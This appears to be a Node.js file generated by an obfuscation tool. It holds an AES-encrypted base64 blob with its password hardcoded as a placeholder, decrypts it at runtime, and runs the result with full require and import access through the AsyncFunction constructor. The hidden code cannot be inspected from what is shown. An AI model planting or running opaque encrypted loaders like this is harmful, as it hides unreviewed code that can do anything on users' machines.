// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.1.1                                     ║
// ║  Encrypted: 2026-07-27 21:34:08 UTC                   ║
// ║  Cipher   : PBKDF2+AES-256-GCM                        ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.1.1
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='T0JGdjTxQN9gi8Wqt9v4K1p5lUnefzE8Zo49uE3PK/8AR1qymf/L1TL6YF4b7DWssmhBTZKPbFIrKNmuf32N+m0VobC5C1HHT6Qa/FHjtbOgmqKERxwjzgLSPH0ew87s2DcvGI6GHsHRQascXoLn/Y2vrQN9qBLcksNBD9eoSaflaLJZ8m/PKatEbgan1UoJ6OypkpO1NzrbUNiA97Qcb8Q3CL0nAcCCq0IqVbP69vJVlL8Ksy4u1b1ZHfkGWKuJ2+qfMft4+s9gYGrvxdLfzzTw3/Ewr8WRfJ6fUjUiATmB8gQ0Y2jhH4qX15ccp3+HEL17lqublBckKDYxgMWdRpd9lAr0Y4R/GJ1dN64CEwWiol92Nf5qeUtAdggb7+e8KmhwKrGeJWB/xEr+DGpKgfZIN6IitJ3NjXsjMUF4fCxccX6e8TaSqU0aZh7RvyrXPRbFHwXGuOhZ6e6VI/NXwUQ1mlnZ2rKagH4cJAmsmtC2rmIjCnDXykykqHA70VmV4Sg7h/SV8ZxT/yvPdyqC6JkG4tibsfllGc0b00qJXrbDE7JfYzxz9MaFmo1aTqeGEmXgZXlzo9DEgcndI68p95UIfowMCJzkekCuzllfMYlO/ZKX3ST6Vkt/7aLHPJ0fhzulwyA0+M9q5z8hHesbTvXqleffDzGMm9Ao06kK74+DsRkvHzkM4AXphBG/YL22lI5IqBZ6FmVU30n1HXeEhZOQ5RwthuaYDGEMRhKVMtaytTjJ2hpzCc0XzF47TucGonaLUlM5uthQJHbHXXFiu4UJKzWnkHaKrqmBMKJEoPcRd/5v7Vgdrl1/LztDO31+GuQSxZV+uuDZWjsy4wadDgg1urdh/KjJAwhN8MXkt7FFkTQyCpGRm/SZPDPfIcufq8kUAZKBLXsT2j+y9iFXA1Yh0Aqv2ejXj3YXXcA/KvQ/lL3Pmsvnvp3wTsd6Kb3YUKD42XjmY26Q2f450aZ2PllTFpaSn5HngC3wWEwLgp8YYgd7FhsbYfoqZTYD9GBdqlg/Zn6c/J6CmVUhCspFpGqvf5xXEzrnqR2SnHfq1A87CGrHhG4ZOvNkzTchni9I6SAr/w9V7L9JDQbsn4cz4tXARECyvXRwfAKVe/kw7kwluAS9lWm5Z2WuKPnceMkA18Lou1mEGufJY93kBxMql5bdjq3iIwkEIKlEnkwbi9jgzNQRlyBkaIheUktccfML4yUDi5wUIWtFsoRgqTcHgZfP+wg=';const _IH='8478e77d27a0606580e4e5528eb41ffda724d87a381892aff09a28283fcd0c0a';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];
  const _MAGIC="OBFv4";
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i];
    if(!_d.toString('utf8',0,5).startsWith(_MAGIC))throw new Error('[Obfuscationary] Bad header');
    const blob=_d.slice(5);
    const s=blob.slice(0,16), iv=blob.slice(16,28), ct=blob.slice(28);
    const kk=_c2.pbkdf2Sync(pw,s,100000,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);
    const tag=ct.slice(ct.length-16), cdata=ct.slice(0,ct.length-16);
    dc.setAuthTag(tag);
    _d=Buffer.concat([dc.update(cdata),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _import=(m)=>import(m);
  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
})();
